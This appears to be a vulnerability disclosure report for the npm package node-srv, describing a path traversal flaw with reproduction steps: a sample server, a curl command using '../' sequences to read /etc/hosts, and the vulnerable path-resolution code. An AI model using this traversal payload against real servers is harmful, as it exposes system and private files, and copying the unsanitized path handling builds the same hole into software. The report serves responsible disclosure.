Summary:

Hi Guys,

**node-srv** contains Path Traversal vulnerability, which allows malicious user to read content of any file with known path.

**Module:** 

Simple static node.js server. Supports Heroku and Grunt.js
https://www.npmjs.com/package/node-srv


**Description**

```node-srv``` does not sanitize path in the correct way, so ```curl``` can be used to retrieve content of any file from the remote server.



## Steps To Reproduce:

- install ```node-srv```

```
$ npm install node-srv
```

- create simple server:

```javascript
//Require module 
var Server = require('node-srv');

// Start server 
var srv = new Server({
    port: 8080,
    root: './',
    logs: true
}, function () {
    console.log('Server stopped');
});
```

- run server:

```
$ node app.js
```

- visit ```http://127.0.0.1:8080``` to verify if everything is fine.

- now, run following ```curl``` command (please adjust numbers of ../ to your system):

```
$ curl -v --path-as-is http://127.0.0.1:8080/node_modules/../../../../../etc/hosts
```

You should see the content of ```/etc/hosts``` file:

{F257357}


The problem is that url read from the user is not sanitize in any way against classic ```../``` path traversal payload:


```javascript
return new Promise((function(_this) {
        return function(resolve, reject) {
          var uri;
          uri = url.parse(req.url);
          return resolve(uri.pathname);
        };
      })(this)).then((function(_this) {
        return function(pathname) {
          filePath = pathname;
          filePath = filePath.replace(/\/$/, "/" + _this.options.index);
          filePath = filePath.replace(/^\//, "");
          filePath = path.resolve(process.cwd(), _this.options.root || './', filePath);
          return _this.processRequest(res, filePath);
        };
```



## Supporting Material/References:

Configuration I've used to find this vulnerability:

- macOS HighSierra 10.13.3
- node 8.9.3
- npm 5.5.1
- curl 7.54.0

## Wrap up

I hope this report will help to keep Node ecosystem more safe. If you have any questions about any details of this finding, please let me know in comment.

Thank you
